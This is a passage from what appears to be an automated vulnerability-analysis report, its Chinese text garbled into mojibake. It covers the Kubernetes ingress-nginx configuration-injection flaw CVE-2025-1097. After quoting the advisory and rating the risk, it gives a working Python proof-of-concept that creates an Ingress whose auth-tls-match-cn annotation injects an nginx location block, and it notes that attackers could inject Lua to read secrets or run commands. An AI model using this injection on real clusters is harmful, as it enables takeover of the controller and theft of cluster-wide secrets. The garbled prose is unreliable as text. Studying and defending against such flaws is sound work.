5.  **å®‰å…¨æ€§**: æ­¤è„šæœ¬åŒ…å«æ‰§è¡Œä»»æ„å‘½ä»¤çš„æ„å›¾ï¼Œä»…åº”ç”¨äºæˆæƒæµ‹è¯•å’Œç ”ç©¶ç›®çš„ï¼Œåœ¨å—æ§ç¯å¢ƒä¸­æµ‹è¯•å·²çŸ¥çš„æ˜“å—æ”»å‡»ç‰ˆæœ¬ã€‚åˆ‡å‹¿åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–æœªæˆæƒçš„ç³»ç»Ÿä¸Šè¿è¡Œã€‚

---


## Issue #131007 CVE-2025-1097: ingress-nginx controller - configuration injection via unsanitized auth-tls-match-cn annotation

- Issue é“¾æ¥ï¼š[#131007](https://github.com/kubernetes/kubernetes/issues/131007)

### Issue å†…å®¹

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) (Score: 8.8, High)

A security issue was discovered in [ingress-nginx](https://github.com/kubernetes/ingress-nginx) where the \`auth-tls-match-cn\` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

##### Fixed Versions

- ingress-nginx [main@06c992a](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/06c992abd8eef9710359a236c443c613d29fdfad)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

Suspicious data within the \`auth-tls-match-cn\` annotation of an Ingress resource could indicate an attempt to exploit this vulnerability.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld, Ronen Shustin, Sagi Tzadik and Hillai Ben Sasson from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªç¼–å·ä¸ºCVE-2025-1097çš„å®‰å…¨æ¼æ´ï¼Œå½±å“Kubernetesçš„ingress-nginxæ§åˆ¶å™¨ã€‚

1.  **æ¼æ´ç±»å‹**ï¼šé…ç½®æ³¨å…¥ (Configuration Injection)ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡Ingressèµ„æºä¸­çš„`nginx.ingress.kubernetes.io/auth-tls-match-cn`æ³¨è§£æ³¨å…¥æ¶æ„çš„Nginxé…ç½®ã€‚
2.  **è§¦å‘æ¡ä»¶**ï¼šæ”»å‡»è€…éœ€è¦æ‹¥æœ‰åœ¨Kubernetesé›†ç¾¤ä¸­åˆ›å»ºæˆ–æ›´æ–°Ingressèµ„æºçš„æƒé™ (CVSSå‘é‡ `PR:L` - Low Privilege Required)ã€‚
3.  **æ½œåœ¨å½±å“**ï¼š
    *   **ä»»æ„ä»£ç æ‰§è¡Œ (RCE)**ï¼šæ³¨å…¥çš„Nginxé…ç½®å¯èƒ½åŒ…å«å¦‚Luaè„šæœ¬ç­‰å¯æ‰§è¡Œä»£ç ï¼Œä»è€Œåœ¨ingress-nginxæ§åˆ¶å™¨çš„Podä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
    *   **æ•æ„Ÿä¿¡æ¯æ³„éœ²**ï¼šæ³¨å…¥çš„é…ç½®å¯èƒ½è¢«ç”¨æ¥è¯»å–ingress-nginxæ§åˆ¶å™¨å¯è®¿é—®çš„æ•æ„Ÿæ–‡ä»¶ï¼Œä¾‹å¦‚Kubernetes Secretsã€‚Issueä¸­æåˆ°ï¼Œåœ¨é»˜è®¤å®‰è£…ä¸‹ï¼Œæ§åˆ¶å™¨å¯èƒ½å…·æœ‰è®¿é—®é›†ç¾¤èŒƒå›´å†…æ‰€æœ‰Secretsçš„æƒé™ï¼Œè¿™æå¤§åœ°å¢åŠ äº†ä¿¡æ¯æ³„éœ²çš„é£é™©å’Œå½±å“èŒƒå›´ã€‚
4.  **CVSSè¯„åˆ†**ï¼šIssueä¸­æ˜ç¡®ç»™å‡ºäº†CVSS 3.1è¯„åˆ†ä¸º8.8 (High)ï¼Œå‘é‡ä¸º `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`ã€‚è¿™è¡¨ç¤ºï¼š
    *   æ”»å‡»é€”å¾„ï¼šç½‘ç»œ (AV:N)
    *   æ”»å‡»å¤æ‚åº¦ï¼šä½ (AC:L)
    *   æ‰€éœ€æƒé™ï¼šä½ (PR:L) - éœ€è¦åˆ›å»º/æ›´æ–°Ingressæƒé™
    *   ç”¨æˆ·äº¤äº’ï¼šæ— éœ€ (UI:N)
    *   å½±å“èŒƒå›´ï¼šä¸å˜ (S:U) - æ”»å‡»æˆåŠŸåå½±å“ä»åœ¨ingress-nginxç»„ä»¶å†…ï¼Œä½†å¯èƒ½é€šè¿‡æ³„éœ²çš„Secretsæ‰©å¤§å½±å“ã€‚
    *   æœºå¯†æ€§å½±å“ï¼šé«˜ (C:H) - å¯è¯»å–æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚é›†ç¾¤Secretsã€‚
    *   å®Œæ•´æ€§å½±å“ï¼šé«˜ (I:H) - å¯ä¿®æ”¹é…ç½®ï¼Œå¯èƒ½å¯¼è‡´RCEã€‚
    *   å¯ç”¨æ€§å½±å“ï¼šé«˜ (A:H) - RCEæˆ–é…ç½®ç ´åå¯èƒ½å¯¼è‡´æœåŠ¡ä¸­æ–­ã€‚
5.  **é£é™©åˆ¤æ–­ä¾æ®**ï¼š
    *   è¯¥é—®é¢˜æ˜ç¡®æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œè€Œéæäº¤è€…æ“ä½œä¸å½“ã€‚
    *   æ ¹æ®CVSSè¯„åˆ†8.8ï¼Œå±äºé«˜é£é™© (High)ã€‚
    *   è¯¥æ¼æ´å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ (RCE) å’Œæ•æ„Ÿä¿¡æ¯ï¼ˆé›†ç¾¤èŒƒå›´Secretsï¼‰æ³„éœ²ï¼Œç¬¦åˆé«˜é£é™©æ ‡å‡†ï¼ˆè§„åˆ™7ï¼‰ã€‚
    *   æ”»å‡»è€…è™½ç„¶éœ€è¦ä½æƒé™ï¼ˆåˆ›å»º/æ›´æ–°Ingressï¼‰ï¼Œä½†å…¶æ½œåœ¨å½±å“å·¨å¤§ï¼ˆRCEï¼Œè®¿é—®æ‰€æœ‰Secretsï¼‰ï¼Œå› æ­¤ä¸åº”é™çº§ï¼ˆè§„åˆ™5çš„åå‘åº”ç”¨ï¼Œé«˜å½±å“è¦†ç›–ä½æƒé™è¦æ±‚ï¼‰ã€‚
    *   åœ¨å¤šç§Ÿæˆ·åœºæ™¯ä¸‹ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼ˆæ‹¥æœ‰æŸå‘½åç©ºé—´çš„Ingressæƒé™ï¼‰å¯èƒ½é€šè¿‡æ­¤æ¼æ´å±åŠæ•´ä¸ªé›†ç¾¤çš„Secretsæˆ–è·å¾—ingress-controllerçš„æ‰§è¡Œæƒé™ï¼Œå½±å“å…¶ä»–ç”¨æˆ·å’Œæ•´ä¸ªé›†ç¾¤ï¼ˆè§„åˆ™8ï¼‰ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueæè¿°äº†ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import os
import uuid
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def exploit():
    """
    å°è¯•åˆ©ç”¨ CVE-2025-1097 æ¼æ´åˆ›å»ºæ¶æ„ Ingress.
    """
    # è„šæœ¬æ‰§è¡Œè¶…æ—¶æ—¶é—´ (ç§’)
    timeout_seconds = 110
    start_time = time.time()

    try:
        # å°è¯•ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig æ–‡ä»¶
        # å‡è®¾ ~/.kube/config å­˜åœ¨ä¸”æœ‰æ•ˆ
        print("[*] å°è¯•åŠ è½½ Kubernetes é…ç½®...")
        try:
            config.load_kube_config()
            print("[+] Kubernetes é…ç½®åŠ è½½æˆåŠŸ.")
        except Exception as e:
            print(f"[-] åŠ è½½ Kubernetes é…ç½®å¤±è´¥: {e}")
            print("[-] è¯·ç¡®ä¿ ~/.kube/config æ–‡ä»¶å­˜åœ¨ä¸”é…ç½®æ­£ç¡®ï¼Œæˆ–è€… KUBECONFIG ç¯å¢ƒå˜é‡å·²è®¾ç½®ã€‚")
            return

        # åˆ›å»º Kubernetes API å®¢æˆ·ç«¯
        networking_v1_api = client.NetworkingV1Api()
        core_v1_api = client.CoreV1Api()

        # å®šä¹‰ç›®æ ‡å‘½åç©ºé—´å’Œèµ„æºåç§°
        # å¦‚æœ 'poc-namespace' ä¸å­˜åœ¨ï¼Œè„šæœ¬å°†å°è¯•åˆ›å»ºå®ƒ
        namespace = "poc-namespace-" + str(uuid.uuid4())[:8]
        ingress_name = "poc-ingress-" + str(uuid.uuid4())[:8]
        service_name = "poc-service-" + str(uuid.uuid4())[:8]
        pod_name = "poc-pod-" + str(uuid.uuid4())[:8] # ä¸ºæœåŠ¡åˆ›å»ºä¸€ä¸ªåç«¯Pod

        print(f"[*] å‡†å¤‡åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»ºèµ„æº...")

        # æ£€æŸ¥å¹¶åˆ›å»ºå‘½åç©ºé—´
        try:
            core_v1_api.read_namespace(name=namespace)
            print(f"[*] å‘½åç©ºé—´ '{namespace}' å·²å­˜åœ¨.")
        except ApiException as e:
            if e.status == 404:
                print(f"[*] å‘½åç©ºé—´ '{namespace}' ä¸å­˜åœ¨ï¼Œå°è¯•åˆ›å»º...")
                ns_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace))
                try:
                    core_v1_api.create_namespace(body=ns_body)
                    print(f"[+] å‘½åç©ºé—´ '{namespace}' åˆ›å»ºæˆåŠŸ.")
                    # ç­‰å¾…å‘½åç©ºé—´å®é™…å¯ç”¨
                    time.sleep(5)
                except ApiException as create_e:
                    print(f"[-] åˆ›å»ºå‘½åç©ºé—´ '{namespace}' å¤±è´¥: {create_e}")
                    return
            else:
                print(f"[-] æ£€æŸ¥å‘½åç©ºé—´ '{namespace}' æ—¶å‡ºé”™: {e}")
                return

        # åˆ›å»ºä¸€ä¸ªç®€å•çš„åç«¯ Pod å’Œ Serviceï¼Œä»¥ä¾¿ Ingress æœ‰æ•ˆ
        print(f"[*] åˆ›å»ºåç«¯ Pod '{pod_name}'...")
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {"name": pod_name, "labels": {"app": service_name}},
            "spec": {
                "containers": [{
                    "name": "nginx",
                    "image": "nginx:alpine", # ä½¿ç”¨ä¸€ä¸ªç®€å•çš„é•œåƒ
                    "ports": [{"containerPort": 80}]
                }]
            }
        }
        try:
            core_v1_api.create_namespaced_pod(body=pod_manifest, namespace=namespace)
            print(f"[+] Pod '{pod_name}' åˆ›å»ºæˆåŠŸ.")
            # ç­‰å¾…Podå¯åŠ¨
            print("[*] ç­‰å¾… Pod å¯åŠ¨...")
            time.sleep(15)
        except ApiException as e:
            print(f"[-] åˆ›å»º Pod '{pod_name}' å¤±è´¥: {e}")
            # å°è¯•æ¸…ç†å‘½åç©ºé—´
            try:
                core_v1_api.delete_namespace(name=namespace, body=client.V1DeleteOptions())
                print(f"[*] æ¸…ç†ï¼šå‘½åç©ºé—´ '{namespace}' å·²åˆ é™¤ã€‚")
            except ApiException as del_e:
                print(f"[-] æ¸…ç†å‘½åç©ºé—´ '{namespace}' å¤±è´¥: {del_e}")
            return

        print(f"[*] åˆ›å»ºåç«¯ Service '{service_name}'...")
        service_manifest = {
            "apiVersion": "v1",
            "kind": "Service",
            "metadata": {"name": service_name},
            "spec": {
                "selector": {"app": service_name},
                "ports": [{"protocol": "TCP", "port": 80, "targetPort": 80}]
            }
        }
        try:
            core_v1_api.create_namespaced_service(body=service_manifest, namespace=namespace)
            print(f"[+] Service '{service_name}' åˆ›å»ºæˆåŠŸ.")
        except ApiException as e:
            print(f"[-] åˆ›å»º Service '{service_name}' å¤±è´¥: {e}")
            # å°è¯•æ¸…ç†èµ„æº
            try:
                core_v1_api.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
                core_v1_api.delete_namespace(name=namespace, body=client.V1DeleteOptions())
                print(f"[*] æ¸…ç†ï¼šPod å’Œå‘½åç©ºé—´ '{namespace}' å·²åˆ é™¤ã€‚")
            except ApiException as del_e:
                print(f"[-] æ¸…ç† Pod/å‘½åç©ºé—´ '{namespace}' å¤±è´¥: {del_e}")
            return


        # æ„é€ æ¶æ„çš„ Ingress æ³¨è§£ payload
        # è¿™ä¸ª payload å°è¯•é—­åˆå½“å‰çš„ Nginx é…ç½®å— (ä¾‹å¦‚ if å—)ï¼Œç„¶åæ³¨å…¥ä¸€ä¸ªæ–°çš„ location å—
        # æ³¨æ„ï¼šå®é™…å¯ç”¨çš„æ³¨å…¥æ–¹å¼å¯èƒ½æ›´å¤æ‚ï¼Œå–å†³äº ingress-nginx å¦‚ä½•å¤„ç†è¯¥æ³¨è§£
        # è¿™ä¸ª payload å°è¯•æ³¨å…¥ä¸€ä¸ª location /cve-2025-1097-poc è¿”å›ç‰¹å®šå†…å®¹
        # ä½¿ç”¨åŒåæ–œæ  \\n æ¥è¡¨ç¤ºæ¢è¡Œç¬¦
        malicious_payload = '.*\\n}\\nlocation /cve-2025-1097-poc { return 200 "POC Successful via CVE-2025-1097"; } #'
        print(f"[*] æ„é€ æ¶æ„çš„ Ingress å¯¹è±¡ '{ingress_name}'...")
        print(f"[*] ä½¿ç”¨ Payload: {malicious_payload}")

        ingress_manifest = {
            "apiVersion": "networking.k8s.io/v1",
            "kind": "Ingress",
            "metadata": {
                "name": ingress_name,
                "namespace": namespace,
                "annotations": {
                    # å…³é”®çš„æ¶æ„æ³¨è§£
                    "nginx.ingress.kubernetes.io/auth-tls-match-cn": malicious_payload,
                    # å…¶ä»–ä¸€äº›æ³¨è§£ï¼Œç¡®ä¿ Ingress æ§åˆ¶å™¨å¤„ç†å®ƒ
                    "nginx.ingress.kubernetes.io/auth-tls-verify-client": "optional_no_ca", # éœ€è¦ä¸€ä¸ªå¯ç”¨ auth-tls çš„é…ç½®
                    "kubernetes.io/ingress.class": "nginx" # ç¡®ä¿è¢« nginx ingress controller å¤„ç†
                }
            },
            "spec": {
                # éœ€è¦æŒ‡å®š TLS é…ç½®æ¥è§¦å‘ auth-tls ç›¸å…³é€»è¾‘
                 "tls": [{
                     "hosts": ["poc.example.com"], # ç¤ºä¾‹åŸŸå
                     "secretName": "poc-tls-secret" # éœ€è¦ä¸€ä¸ªå­˜åœ¨çš„ secret æˆ–è®© cert-manager åˆ›å»º
                     # æ³¨æ„ï¼šè¿™é‡Œå‡è®¾å­˜åœ¨åä¸º poc-tls-secret çš„ TLS secret
                     # åœ¨å®é™…æµ‹è¯•ä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦å…ˆåˆ›å»ºè¿™ä¸ª secret æˆ–ä½¿ç”¨ cert-manager
                 }],
                "rules": [{
                    "host": "poc.example.com", # ç¤ºä¾‹åŸŸå
                    "http": {
                        "paths": [{
                            "path": "/",
                            "pathType": "Prefix",
                            "backend": {
                                "service": {
                                    "name": service_name,
                                    "port": {"number": 80}
                                }
                            }
                        }]
                    }
                }]
            }
        }

        # å°è¯•åˆ›å»ºæ¶æ„çš„ Ingress
        print(f"[*] å°è¯•åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»º Ingress '{ingress_name}'...")
        networking_v1_api.create_namespaced_ingress(body=ingress_manifest, namespace=namespace)
        print(f"[+] æ¶æ„ Ingress '{ingress_name}' åˆ›å»ºæˆåŠŸ.")
        print("[*] ç­‰å¾… ingress-nginx æ§åˆ¶å™¨å¤„ç†è¯¥ Ingress (çº¦ 30 ç§’)...")

        # ç­‰å¾…ä¸€æ®µæ—¶é—´è®© Ingress Controller æ›´æ–° Nginx é…ç½®
        wait_interval = 5
        elapsed_time = time.time() - start_time
        remaining_wait = 30 # ç­‰å¾…30ç§’è®©controlleræ›´æ–°é…ç½®

        while remaining_wait > 0 and (time.time() - start_time) < timeout_seconds:
             print(f"[*] ç­‰å¾… {remaining_wait} ç§’ ...")
             time.sleep(min(wait_interval, remaining_wait))
             remaining_wait -= wait_interval
             # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
             if time.time() - start_time >= timeout_seconds:
                 print("[-] æ‰§è¡Œè¶…æ—¶!")
                 break

        if time.time() - start_time < timeout_seconds:
            print("[+] ç­‰å¾…å®Œæˆ.")
            print("[*] ç°åœ¨å¯ä»¥å°è¯•è®¿é—® ingress controller çš„ IP/åŸŸåï¼Œè·¯å¾„ä¸º /cve-2025-1097-poc")
            print("[*] å¦‚æœæˆåŠŸï¼Œåº”è¯¥ä¼šæ”¶åˆ° 'POC Successful via CVE-2025-1097' çš„å“åº”ã€‚")
            print("[*] ä¾‹å¦‚: curl -k https://<ingress-controller-ip-or-domain>/cve-2025-1097-poc -H 'Host: poc.example.com'")
            print("[*] æ³¨æ„: éœ€è¦ç¡®ä¿ç½‘ç»œå¯è¾¾ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦æä¾›ä¸€ä¸ªå®¢æˆ·ç«¯è¯ä¹¦ï¼ˆå³ä½¿éªŒè¯æ˜¯ optional_no_caï¼‰ã€‚")
            print("[*] POCæ¼”ç¤ºå®Œæˆï¼Œå°†åœ¨10ç§’åè‡ªåŠ¨æ¸…ç†èµ„æº...")
            time.sleep(10) # ç­‰å¾…ç”¨æˆ·æŸ¥çœ‹ä¿¡æ¯


    except ApiException as e:
        print(f"[-] Kubernetes API æ“ä½œå¤±è´¥: {e.status} {e.reason}")
        print(f"[-] é”™è¯¯è¯¦æƒ…: {e.body}")
        if e.status == 403:
             print("[-] æƒé™ä¸è¶³ã€‚è¯·ç¡®ä¿ä½¿ç”¨çš„ kubeconfig å…·æœ‰åœ¨ç›®æ ‡å‘½åç©ºé—´åˆ›å»º Ingressã€Serviceã€Pod çš„æƒé™ã€‚")
    except Exception as e:
        print(f"[-] æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        # æ¸…ç†åˆ›å»ºçš„èµ„æº
        print("[*] å¼€å§‹æ¸…ç†èµ„æº...")
        try:
            # æ£€æŸ¥æ˜¯å¦å·²è¶…æ—¶
            if time.time() - start_time >= timeout_seconds:
                print("[!] ç”±äºè¶…æ—¶ï¼Œå¯èƒ½éƒ¨åˆ†èµ„æºæœªåˆ›å»ºï¼Œå°è¯•å¼ºåˆ¶æ¸…ç†...")

            # åˆ é™¤ Ingress (å¦‚æœå­˜åœ¨)
            print(f"[*] å°è¯•åˆ é™¤ Ingress '{ingress_name}' åœ¨å‘½åç©ºé—´ '{namespace}'...")
            try:
                networking_v1_api.delete_namespaced_ingress(name=ingress_name, namespace=namespace, body=client.V1DeleteOptions())
                print(f"[+] Ingress '{ingress_name}' å·²åˆ é™¤.")
            except ApiException as e:
                if e.status != 404: # å¿½ç•¥ Not Found é”™è¯¯
                    print(f"[-] åˆ é™¤ Ingress '{ingress_name}' å¤±è´¥: {e.status} {e.reason}")
                else:
                    print(f"[*] Ingress '{ingress_name}' æœªæ‰¾åˆ°ï¼Œå¯èƒ½å·²è¢«åˆ é™¤æˆ–æœªæˆåŠŸåˆ›å»ºã€‚")

            # åˆ é™¤ Service (å¦‚æœå­˜åœ¨)
            print(f"[*] å°è¯•åˆ é™¤ Service '{service_name}' åœ¨å‘½åç©ºé—´ '{namespace}'...")
            try:
                 core_v1_api.delete_namespaced_service(name=service_name, namespace=namespace, body=client.V1DeleteOptions())
                 print(f"[+] Service '{service_name}' å·²åˆ é™¤.")
            except ApiException as e:
                 if e.status != 404:
                     print(f"[-] åˆ é™¤ Service '{service_name}' å¤±è´¥: {e.status} {e.reason}")
                 else:
                     print(f"[*] Service '{service_name}' æœªæ‰¾åˆ°ã€‚")

            # åˆ é™¤ Pod (å¦‚æœå­˜åœ¨)
            print(f"[*] å°è¯•åˆ é™¤ Pod '{pod_name}' åœ¨å‘½åç©ºé—´ '{namespace}'...")
            try:
                 core_v1_api.delete_namespaced_pod(name=pod_name, namespace=namespace, body=client.V1DeleteOptions())
                 print(f"[+] Pod '{pod_name}' å·²åˆ é™¤.")
            except ApiException as e:
                 if e.status != 404:
                     print(f"[-] åˆ é™¤ Pod '{pod_name}' å¤±è´¥: {e.status} {e.reason}")
                 else:
                     print(f"[*] Pod '{pod_name}' æœªæ‰¾åˆ°ã€‚")

            # åˆ é™¤å‘½åç©ºé—´ (å¦‚æœå­˜åœ¨)
            print(f"[*] å°è¯•åˆ é™¤å‘½åç©ºé—´ '{namespace}'...")
            try:
                core_v1_api.delete_namespace(name=namespace, body=client.V1DeleteOptions())
                # ç­‰å¾…å‘½åç©ºé—´åˆ é™¤å®Œæˆ
                print("[*] ç­‰å¾…å‘½åç©ºé—´åˆ é™¤...")
                time.sleep(10) # ç­‰å¾…èµ„æºæ¸…ç†
                print(f"[+] å‘½åç©ºé—´ '{namespace}' å·²åˆ é™¤.")
            except ApiException as e:
                if e.status != 404:
                    print(f"[-] åˆ é™¤å‘½åç©ºé—´ '{namespace}' å¤±è´¥: {e.status} {e.reason}")
                else:
                    print(f"[*] å‘½åç©ºé—´ '{namespace}' æœªæ‰¾åˆ°ã€‚")

            print("[+] æ¸…ç†å®Œæˆ.")
        except NameError:
             print("[!] å˜é‡æœªå®šä¹‰ï¼Œå¯èƒ½åœ¨åˆå§‹åŒ–é˜¶æ®µå¤±è´¥ï¼Œæ— æ³•æ‰§è¡Œæ¸…ç†ã€‚")
        except Exception as cleanup_e:
            print(f"[-] æ¸…ç†è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {cleanup_e}")

# ç›´æ¥æ‰§è¡Œ main å‡½æ•°
exploit()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **è„šæœ¬ç›®çš„**ï¼šè¯¥Pythonè„šæœ¬æ—¨åœ¨æ¼”ç¤ºCVE-2025-1097æ¼æ´çš„åˆ©ç”¨ã€‚å®ƒé€šè¿‡åˆ›å»ºä¸€ä¸ªç²¾å¿ƒæ„é€ çš„Kubernetes Ingressèµ„æºï¼Œå°è¯•åœ¨å—å½±å“çš„ingress-nginxæ§åˆ¶å™¨ä¸­æ³¨å…¥è‡ªå®šä¹‰çš„Nginxé…ç½®ã€‚
2.  **è¿è¡Œç¯å¢ƒ**ï¼šè„šæœ¬éœ€è¦å®‰è£…`kubernetes` Pythonåº“ (`pip install kubernetes`)ï¼Œå¹¶ä¸”éœ€è¦èƒ½å¤Ÿè®¿é—®ä¸€ä¸ªè¿è¡Œç€æ˜“å—æ”»å‡»ç‰ˆæœ¬ingress-nginxæ§åˆ¶å™¨çš„Kubernetesé›†ç¾¤ã€‚æ‰§è¡Œè„šæœ¬çš„æœºå™¨éœ€è¦é…ç½®å¥½`kubeconfig`æ–‡ä»¶ï¼ˆé»˜è®¤åœ¨`~/.kube/config`ï¼‰æˆ–è®¾ç½®`KUBECONFIG`ç¯å¢ƒå˜é‡ï¼Œå¹¶ä¸”è¯¥é…ç½®éœ€è¦æœ‰åˆ›å»º/åˆ é™¤Namespaceã€Podã€Serviceå’ŒIngressèµ„æºçš„æƒé™ã€‚
3.  **æ‰§è¡Œæµç¨‹**ï¼š
    *   **åŠ è½½é…ç½®**ï¼šè„šæœ¬é¦–å…ˆå°è¯•åŠ è½½æœ¬åœ°çš„Kubernetesé…ç½®ã€‚
    *   **åˆ›å»ºç¯å¢ƒ**ï¼šä¸ºäº†éš”ç¦»å’Œä¾¿äºæ¸…ç†ï¼Œè„šæœ¬ä¼šå°è¯•åˆ›å»ºä¸€ä¸ªæ–°çš„å‘½åç©ºé—´ (`poc-namespace-<uuid>`)ã€‚ç„¶åï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªç®€å•çš„åç«¯Pod (`poc-pod-<uuid>`) å’Œä¸€ä¸ªå¯¹åº”çš„Service (`poc-service-<uuid>`)ï¼Œè¿™æ˜¯åˆ›å»ºæœ‰æ•ˆIngressæ‰€å¿…éœ€çš„ã€‚
    *   **æ„é€ Payload**ï¼šè„šæœ¬å®šä¹‰äº†ä¸€ä¸ª`malicious_payload`å­—ç¬¦ä¸²ã€‚è¿™ä¸ªå­—ç¬¦ä¸²è®¾è®¡ç”¨äºæ³¨å…¥åˆ°Nginxé…ç½®ä¸­ã€‚å®ƒåŒ…å«`.*\n}\n`æ¥å°è¯•åŒ¹é…ä»»æ„CNã€æ¢è¡Œå¹¶é—­åˆå½“å‰Nginxå—ï¼Œç„¶åæ³¨å…¥ä¸€ä¸ªæ–°çš„`location /cve-2025-1097-poc { return 200 "POC Successful via CVE-2025-1097"; }`å—ï¼Œæœ€åç”¨`#`æ³¨é‡Šæ‰åç»­å¯èƒ½çš„é…ç½®ã€‚
    *   **åˆ›å»ºIngress**ï¼šè„šæœ¬åˆ›å»ºä¸€ä¸ªIngressèµ„æº (`poc-ingress-<uuid>`)ï¼Œå°†`malicious_payload`èµ‹å€¼ç»™`nginx.ingress.kubernetes.io/auth-tls-match-cn`æ³¨è§£ã€‚åŒæ—¶ï¼Œå®ƒè®¾ç½®äº†`nginx.ingress.kubernetes.io/auth-tls-verify-client: "optional_no_ca"`æ¥å¯ç”¨auth-tlsç›¸å…³é€»è¾‘ï¼Œå¹¶æŒ‡å®šäº†ä¸€ä¸ªç¤ºä¾‹çš„TLSé…ç½®ï¼ˆæ³¨æ„ï¼šå®é™…æµ‹è¯•éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„TLS secret `poc-tls-secret`ï¼Œè„šæœ¬å¹¶æœªåˆ›å»ºï¼‰ã€‚
    *   **ç­‰å¾…ä¸éªŒè¯æç¤º**ï¼šåˆ›å»ºIngressåï¼Œè„šæœ¬ä¼šç­‰å¾…30ç§’ï¼Œç»™ingress-nginxæ§åˆ¶å™¨æ—¶é—´æ¥å¤„ç†Ingresså¹¶æ›´æ–°å…¶å†…éƒ¨çš„Nginxé…ç½®ã€‚ç„¶åï¼Œå®ƒä¼šæ‰“å°æç¤ºä¿¡æ¯ï¼ŒæŒ‡å¯¼ç”¨æˆ·å¦‚ä½•æ‰‹åŠ¨éªŒè¯æ¼æ´æ˜¯å¦åˆ©ç”¨æˆåŠŸï¼ˆé€šè¿‡è®¿é—®æ³¨å…¥çš„`/cve-2025-1097-poc`è·¯å¾„ï¼‰ã€‚
    *   **æ¸…ç†**ï¼šåœ¨ç­‰å¾…æˆ–å‘ç”Ÿé”™è¯¯åï¼Œè„šæœ¬ä¼šæ‰§è¡Œæ¸…ç†æ“ä½œï¼Œåˆ é™¤åˆ›å»ºçš„Ingressã€Serviceã€Podå’ŒNamespaceã€‚
4.  **æ½œåœ¨å½±å“ï¼ˆè„šæœ¬æ¼”ç¤ºï¼‰**ï¼šå¦‚æœç›®æ ‡ingress-nginxæ§åˆ¶å™¨å­˜åœ¨æ¼æ´ï¼Œå¹¶ä¸”å¤„ç†äº†æ­¤æ¶æ„Ingressï¼Œå…¶ç”Ÿæˆçš„Nginxé…ç½®å°†åŒ…å«è¢«æ³¨å…¥çš„`location /cve-2025-1097-poc`å—ã€‚è®¿é—®è¯¥è·¯å¾„å°†ç›´æ¥ç”±Nginxè¿”å›ç‰¹å®šå“åº”ï¼Œç»•è¿‡äº†æ­£å¸¸çš„åç«¯æœåŠ¡ä»£ç†ï¼Œè¯æ˜äº†é…ç½®æ³¨å…¥çš„æˆåŠŸã€‚çœŸå®çš„æ”»å‡»è€…å¯ä»¥æ³¨å…¥æ›´å¤æ‚çš„é…ç½®ï¼Œå¦‚æ‰§è¡ŒLuaè„šæœ¬æ¥è¯»å–æ–‡ä»¶ï¼ˆå¦‚æœåŠ¡è´¦æˆ·ä»¤ç‰Œã€Secretsï¼‰æˆ–æ‰§è¡Œå‘½ä»¤ã€‚
5.  **è¶…æ—¶æœºåˆ¶**ï¼šè„šæœ¬åŒ…å«ä¸€ä¸ªå¤§çº¦2åˆ†é’Ÿï¼ˆ110ç§’ï¼‰çš„æ•´ä½“è¶…æ—¶æœºåˆ¶ï¼Œç¡®ä¿è„šæœ¬ä¸ä¼šæ— é™æœŸè¿è¡Œã€‚
